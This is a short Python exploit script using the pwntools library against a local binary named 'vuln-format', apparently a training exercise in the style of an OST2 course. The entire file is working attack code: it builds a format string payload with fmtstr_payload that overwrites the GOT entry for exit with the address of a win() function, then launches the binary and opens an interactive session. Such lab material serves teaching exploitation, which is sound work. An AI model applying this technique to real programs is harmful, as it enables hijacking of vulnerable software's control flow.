#!/usr/bin/env python3
# Format String Exploit â€“ vuln-format (OST2 Style)


from pwn import *

# ---------------- Configuration ----------------

binary_path = './vuln-format'
elf = context.binary = ELF(binary_path)
context.log_level = 'info'

# Target: overwrite GOT entry of a function (e.g., exit)
target_func = 'exit'
target_got = elf.got[target_func]
win_addr = elf.symbols['win']

log.info(f"{target_func} GOT @ {hex(target_got)}")
log.info(f"win() @ {hex(win_addr)}")

# ---------------- Payload Builder ----------------

# Choose where to inject format string: argv[1]
# We'll use fmtstr_payload to auto-generate the payload
offset = 6  # Adjust based on stack layout (from GDB/fuzzing)

payload = fmtstr_payload(offset, {target_got: win_addr}, write_size='short')

# ---------------- Run Exploit ----------------

io = process([binary_path, payload])
io.interactive()
